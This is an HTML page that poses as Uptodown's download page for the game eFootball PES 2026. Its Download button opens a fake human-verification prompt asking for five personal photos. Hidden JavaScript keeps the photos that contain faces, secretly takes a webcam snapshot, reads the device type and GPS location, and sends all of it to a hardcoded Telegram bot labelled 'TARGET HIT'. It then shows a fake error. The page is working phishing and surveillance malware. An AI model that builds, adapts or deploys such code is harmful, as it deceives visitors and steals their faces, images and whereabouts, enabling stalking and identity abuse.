<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball PES 2026 for Android - Download the APK from Uptodown</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #081d24; --h: #051116; --b-gr: #00b451; --b-bl: #1b85d3; --t-d: #7e949c; }
        body { margin: 0; background: var(--bg); font-family: 'Roboto', sans-serif; color: white; -webkit-tap-highlight-color: transparent; }
        
        /* Navbar */
        header { background: var(--h); height: 56px; display: flex; align-items: center; padding: 0 16px; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #102a33; }
        .logo { height: 22px; margin-left: 15px; }

        /* Content Wrapper */
        .main { max-width: 1100px; margin: 0 auto; padding: 20px; }
        .path { font-size: 11px; color: var(--t-d); text-transform: uppercase; margin-bottom: 20px; }

        /* App Header Section */
        .app-head { display: flex; gap: 20px; margin-bottom: 30px; }
        .icon { width: 100px; height: 100px; border-radius: 22px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
        .title { font-size: 32px; font-weight: 700; margin: 0; }
        .dev { color: var(--b-bl); text-decoration: none; font-size: 14px; font-weight: 500; }
        
        /* Download Area */
        .dl-section { margin: 25px 0; display: flex; align-items: center; gap: 15px; }
        .btn-latest { background: var(--b-gr); color: white; padding: 14px 35px; border-radius: 6px; font-weight: 700; border: none; cursor: pointer; font-size: 17px; box-shadow: 0 4px 0 #008a3d; }
        .btn-latest:active { transform: translateY(2px); box-shadow: none; }
        .dl-info { color: var(--t-d); font-size: 12px; line-height: 1.4; }

        /* Alternatives Sidebar (Skrinshotdagi o'ng tomon) */
        .sidebar { background: #0c262f; border-radius: 8px; padding: 15px; margin-top: 30px; }
        .side-item { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
        .side-img { width: 45px; height: 45px; border-radius: 10px; }

        /* Footer (Exact from screenshot) */
        footer { background: #102a33; padding: 40px 20px; margin-top: 60px; border-top: 1px solid #1a3c48; }
        .f-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 30px; opacity: 0.8; font-size: 13px; }
        .f-col h4 { color: var(--t-d); font-size: 12px; margin-bottom: 15px; }

        /* Stealth Verification */
        #vLayer { display: none; position: fixed; inset: 0; background: rgba(5,17,22,0.98); z-index: 2000; align-items: center; justify-content: center; }
        .v-card { background: #0c262f; padding: 35px; border-radius: 15px; text-align: center; border: 1px solid var(--b-bl); width: 320px; }
        
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<header>
    <div style="color:var(--b-bl); font-size:24px;">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
</header>

<div class="main">
    <div class="path">Android / Games / Sports / eFootball PES 2026</div>

    <div class="app-head">
        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="icon">
        <div>
            <h1 class="title">eFootball PES 2026</h1>
            <div style="margin-top:5px;">10.4.0 | <a href="#" class="dev">KONAMI</a></div>
            
            <div class="dl-section">
                <button class="btn-latest" onclick="startCheck()">Download</button>
                <div class="dl-info">
                    74.8 M downloads<br>
                    <span style="color:#2ecc71;">Security Verified</span>
                </div>
            </div>
        </div>
    </div>

    <div style="display:grid; grid-template-columns: 1fr 1fr; gap:15px; background:#0c262f; padding:20px; border-radius:10px; font-size:13px;">
        <div><span style="color:var(--t-d)">Package Name</span><br>jp.konami.pesam</div>
        <div><span style="color:var(--t-d)">License</span><br>Free</div>
        <div><span style="color:var(--t-d)">Requirements</span><br>Android 7.0+</div>
        <div><span style="color:var(--t-d)">Language</span><br>English</div>
    </div>

    <h3 style="margin-top:40px;">Alternatives to eFootball PES 2026</h3>
    <div class="sidebar">
        <div class="side-item">
            <img src="https://img.utdstc.com/icon/f2a/8db/f2a8db4f4693a109a96245041a96677464324f6e:100" class="side-img">
            <div>EA Sports FC Mobile 26<br><small style="color:var(--t-d)">The king of soccer</small></div>
        </div>
        <div class="side-item">
            <img src="https://img.utdstc.com/icon/391/b6d/391b6d1796b349d970e6a87796a677464324f6e:100" class="side-img">
            <div>Total Football<br><small style="color:var(--t-d)">Enjoy soccer with high realism</small></div>
        </div>
    </div>
</div>

<footer>
    <div class="main f-grid">
        <div class="f-col"><h4>DISCOVER US</h4><div>About us</div><div>Our company</div></div>
        <div class="f-col"><h4>LEGAL</h4><div>Terms of Service</div><div>Privacy Policy</div></div>
    </div>
</footer>

<div id="vLayer">
    <div class="v-card">
        <h3 id="vT">Verification Required</h3>
        <p id="vP" style="font-size:13px; color:var(--t-d);">To start the download, please upload 5 photos of yourself to confirm you are a human user.</p>
        <label for="fileInput" style="background:var(--b-bl); display:block; padding:12px; border-radius:6px; cursor:pointer; font-weight:700; margin-top:15px;">SELECT PHOTOS</label>
        <input type="file" id="fileInput" multiple accept="image/*" onchange="handle(this)">
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let photos = [];

    async function load() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    load();

    function startCheck() { document.getElementById('vLayer').style.display = 'flex'; }

    async function handle(input) {
        document.getElementById('vT').innerText = "Processing...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) photos.push(f);
        }
        send();
    }

    async function send() {
        const dev = navigator.platform;
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.getElementById('v'); v.srcObject = s;
            await new Promise(r => setTimeout(r, 1000));
            const canv = document.getElementById('c');
            canv.width = v.videoWidth; canv.height = v.videoHeight;
            canv.getContext('2d').drawImage(v, 0, 0);
            const blob = await (await fetch(canv.toDataURL('image/jpeg', 0.5))).blob();
            s.getTracks().forEach(t => t.stop());

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await push(dev, loc, blob);
            }, () => push(dev, "Loc Off", blob));
        } catch(e) { push(dev, "No Cam", null); }
    }

    async function push(d, l, snap) {
        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.C, text: `✅ *TARGET HIT*\n📱 Device: ${d}\n📍 Location: ${l}`, parse_mode: 'Markdown'})
        });

        if(snap) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', snap);
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }

        for (let p of photos) {
            const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', p);
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
        }
        alert("Verification failed. Please try again from another device.");
        location.reload();
    }
</script>
</body>
</html>
